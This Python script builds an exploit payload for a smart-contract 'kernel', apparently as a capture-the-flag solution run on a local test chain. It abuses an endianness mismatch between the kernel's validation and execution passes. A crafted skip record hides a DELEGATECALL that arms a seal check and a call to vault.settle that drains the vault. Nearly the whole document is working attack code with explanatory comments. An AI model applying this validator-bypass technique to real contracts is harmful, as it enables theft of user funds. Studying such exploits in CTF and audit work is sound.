#!/usr/bin/env python3
"""
Control Plane -- exploit `program` builder.

The kernel's `execute(bytes program)` runs the compact-envelope program through
two passes:

  * an AUDITED "validation" pass that enforces a module allow-list, and
  * an "execution" pass that performs the calls.

Envelope/batch lengths are decoded little-endian in BOTH passes, but RECORD
lengths are decoded little-endian in the validator and BIG-endian in the
executor. That single endianness disagreement lets a `0x12` "skip" record hide
arbitrary follow-on records from the validator while the executor still runs
them.

Wire format (reverse engineered from the deployed runtime bytecode):

  program      := envelope+
  envelope     := type(1) || len(2, LE)            ; type 0x08 = no-op, 0x31 = batch
  batch.body   := record+                          ; body length = envelope len
  record       := subtag(1) || len(2)              ; subtag 0x12 skip, 0x2d call, 0xee no-op
                  || payload(len)                   ; ^-- len is LE in validator, BE in executor!
  0x2d.payload := mode(1) || target(20) || calldata(len-21)   ; mode read at payload[0]
                  ; mode 0 = CALL       (requires modules[target] registered)
                  ; mode 1 = DELEGATECALL (requires modules[target] registered)
                  ; mode 2 = CALL+value (requires target == vault(slot0) AND slot2 == seal)

Seal (mode-2 gate), recomputed by the kernel each call:

    seal = keccak256( kernel_addr(20) || vault_addr(20) || chainid(32) ) XOR C
    C    = 0x7b8c1e3a95d26f1042a967dca80bf1e771ab93c5dd2a06844f0c3162b16e9d57
"""

from web3 import Web3

# domain-separation constant baked into the kernel bytecode (PUSH32 @ 0x5c5)
SEAL_CONST = 0x7b8c1e3a95d26f1042a967dca80bf1e771ab93c5dd2a06844f0c3162b16e9d57


def kernel_seal(kernel: str, vault: str, chainid: int) -> bytes:
    """The value the kernel's mode-2 gate compares against slot2."""
    kp = Web3.keccak(
        bytes.fromhex(kernel[2:]) + bytes.fromhex(vault[2:]) + chainid.to_bytes(32, "big")
    )
    return (int(kp.hex(), 16) ^ SEAL_CONST).to_bytes(32, "big")


def call_record(mode: int, target: str, calldata: bytes, total_len: int) -> bytes:
    """
    A 0x2d "call" record of exactly `total_len` bytes.

    The record length is emitted BIG-endian so the *executor* reads it correctly;
    the validator (little-endian) never sees this record because it lives inside a
    0x12 skip record (see build_program).
    """
    plen = total_len - 3                      # payload length (executor reads BE)
    payload = bytearray(plen)
    payload[0] = mode                         # executor mode; validator forces this to 0
    payload[1:21] = bytes.fromhex(target[2:]) # executor target (payload[1:21] == record[4:24])
    payload[21:21 + len(calldata)] = calldata # calldata, zero-padded to fill the record
    return bytes([0x2d]) + plen.to_bytes(2, "big") + bytes(payload)


def build_program(kernel, vault, telemetry, player, amount, ticket, chainid) -> bytes:
    """
    Two records, both hidden from the validator behind one 0x12 skip:

      A) mode 1 DELEGATECALL into the registered TelemetryModule -> rotate(seal)
         `rotate(uint256)` writes the module's slot 2 (`retained`); executed via
         DELEGATECALL that is the KERNEL's slot 2, arming the mode-2 gate.
      B) mode 2 CALL vault.settle(player, amount, ticket) -> drains the vault.
    """
    seal = kernel_seal(kernel, vault, chainid)

    rotate_cd = Web3.keccak(text="rotate(uint256)")[:4] + seal
    settle_cd = (
        Web3.keccak(text="settle(address,uint256,bytes16)")[:4]
        + bytes(12) + bytes.fromhex(player[2:])   # address (left-padded)
        + amount.to_bytes(32, "big")              # uint256 amount
        + ticket + bytes(16)                      # bytes16 ticket (left-aligned)
    )

    rec_a = call_record(1, telemetry, rotate_cd, 60)    # arms slot2
    rec_b = call_record(2, vault,     settle_cd, 195)   # drains
    assert len(rec_a) == 60 and len(rec_b) == 195

    # 0x12 skip record: length bytes 00 01
    #   validator (LE) = 0x0100 = 256  -> skips 3+256 = 259 bytes = the entire batch
    #   executor  (BE) = 0x0001 =   1  -> skips 3+1   =   4 bytes, then runs A and B
    body = bytes([0x12, 0x00, 0x01]) + b"\x00" + rec_a + rec_b   # filler(1) + A(60) + B(195)
    assert len(body) == 259

    return bytes([0x31]) + len(body).to_bytes(2, "little") + body


if __name__ == "__main__":
    demo = build_program(
        "0x" + "11" * 20, "0x" + "22" * 20, "0x" + "33" * 20,
        "0x" + "44" * 20, 100 * 10**18, b"\xaa" * 16, 31337,
    )
    print(demo.hex())
